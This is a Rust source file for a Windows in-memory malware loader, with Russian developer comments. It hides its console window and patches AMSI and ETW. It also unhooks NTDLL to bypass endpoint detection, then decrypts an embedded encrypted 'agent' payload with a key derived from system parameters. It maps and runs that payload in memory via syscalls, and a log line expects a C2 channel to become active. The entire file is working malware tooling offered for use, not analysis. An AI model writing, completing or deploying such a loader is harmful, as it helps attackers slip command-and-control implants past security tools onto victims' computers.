// src/main.rs

#![windows_subsystem = "windows"]

use std::error::Error;

// ИСПРАВЛЕНО: Импорт из library crate
use runtime_loader_rust::{
    log, patch_amsi, patch_etw, unhook_ntdll,
    PELoader, ManualMapper,
    data::ENCRYPTED_AGENT,
    crypto::get_decryption_key
};

use aes::Aes128;
use block_modes::{BlockMode, Ecb};
use block_modes::block_padding::Pkcs7;

// ИСПРАВЛЕНО: Правильный тип с generic параметрами
type Aes128Ecb = Ecb<Aes128, Pkcs7>;

fn decrypt_aes_ecb(ciphertext: &[u8], key: &[u8]) -> Vec<u8> {
    let cipher = Aes128Ecb::new_from_slices(key, &[]).expect("[!] Invalid AES key");
    cipher.decrypt_vec(ciphertext).expect("[!] AES decryption failed")
}

fn main() -> Result<(), Box<dyn Error>> {
    // === DEBUG CONSOLE (только в debug режиме) ===
    #[cfg(debug_assertions)]
    unsafe {
        use winapi::um::consoleapi::AllocConsole;
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{ShowWindow, SW_SHOW};
        
        AllocConsole();
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, SW_SHOW);
        }
    }

    // === STEALTH MODE (скрываем консоль в release режиме) ===
    #[cfg(not(debug_assertions))]
    unsafe {
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{ShowWindow, SW_HIDE};
        
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, SW_HIDE);
        }
    }

    log!("=== RUNTIME LOADER RUST STARTED ===");
    log!("[*] Version: Autonomous with embedded payload + dynamic keys + syscalls");

    // ДОБАВЛЕНО: Проверка embedded данных
    log!("[DEBUG] ENCRYPTED_AGENT size: {} bytes", ENCRYPTED_AGENT.len());
    
    // ИСПРАВЛЕНО: Используем динамический ключ
    let key = get_decryption_key();
    log!("[DEBUG] Dynamic AES key size: {} bytes", key.len());
    log!("[+] Using dynamic key based on system parameters");
    
    if ENCRYPTED_AGENT.len() == 0 {
        log!("[!] CRITICAL ERROR: Embedded payload is empty!");
        log!("[!] Solution: Run 'python exe_guard/rust_loader_generator.py'");
        std::thread::sleep(std::time::Duration::from_secs(10));
        return Err("Empty embedded payload".into());
    }

    log!("[*] Starting EDR bypass sequence...");

    // EDR bypass
    if patch_amsi() {
        log!("[+] AMSI patched successfully");
    } else {
        log!("[!] AMSI patch failed");
    }

    if patch_etw() {
        log!("[+] ETW patched successfully");
    } else {
        log!("[!] ETW patch failed");
    }

    match unhook_ntdll() {
        Ok(_) => log!("[+] NTDLL unhooked successfully"),
        Err(e) => log!("[!] NTDLL unhook failed: {}", e),
    }

    log!("[*] Starting payload decryption...");

    let encrypted = &ENCRYPTED_AGENT;

    log!("[+] Embedded encrypted payload size: {} bytes", encrypted.len());
    log!("[+] Dynamic AES key size: {} bytes", key.len());

    // ИСПРАВЛЕНО: Используем динамический ключ
    let decrypted = match std::panic::catch_unwind(|| {
        decrypt_aes_ecb(encrypted, &key)
    }) {
        Ok(data) => {
            log!("[+] Payload decrypted successfully: {} bytes", data.len());
            data
        },
        Err(_) => {
            log!("[!] CRITICAL ERROR: AES decryption failed!");
            log!("[!] Possible causes: corrupted payload or wrong key");
            std::thread::sleep(std::time::Duration::from_secs(10));
            return Err("AES decryption failed".into());
        }
    };

    // In-memory execution с разрешением импортов
    log!("[*] Starting in-memory PE execution with syscalls...");

    match PELoader::new(&decrypted) {
        Ok(pe_loader) => {
            log!("[+] PE parsed successfully");
            log!("[DEBUG] PE entry point: 0x{:X}", pe_loader.get_entry_point());
            log!("[DEBUG] PE image size: {} bytes", pe_loader.get_image_size());

            match ManualMapper::new(pe_loader) {
                Ok(mut mapper) => {
                    log!("[+] Memory allocated for PE image via syscalls");

                    if let Err(e) = mapper.map_sections() {
                        log!("[!] Failed to map sections: {}", e);
                        std::thread::sleep(std::time::Duration::from_secs(5));
                        return Ok(());
                    }

                    log!("[+] PE sections mapped successfully");

                    if let Err(e) = mapper.resolve_imports() {
                        log!("[!] Failed to resolve imports: {}", e);
                        std::thread::sleep(std::time::Duration::from_secs(5));
                        return Ok(());
                    }

                    log!("[+] Imports resolved successfully");
                    log!("[*] Executing payload...");

                    if let Err(e) = mapper.execute() {
                        log!("[!] Failed to execute PE: {}", e);
                        std::thread::sleep(std::time::Duration::from_secs(5));
                        return Ok(());
                    }

                    log!("[+] PE executed successfully in memory - C2 should be active");
                },
                Err(e) => {
                    log!("[!] Failed to create mapper: {}", e);
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
            }
        },
        Err(e) => {
            log!("[!] Failed to parse PE: {}", e);
            std::thread::sleep(std::time::Duration::from_secs(5));
        }
    }

    log!("=== RUNTIME LOADER EXECUTION COMPLETED ===");
    log!("[*] Press Enter to exit...");

    // ДОБАВЛЕНО: Ждем ввод для диагностики
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).ok();

    Ok(())
}
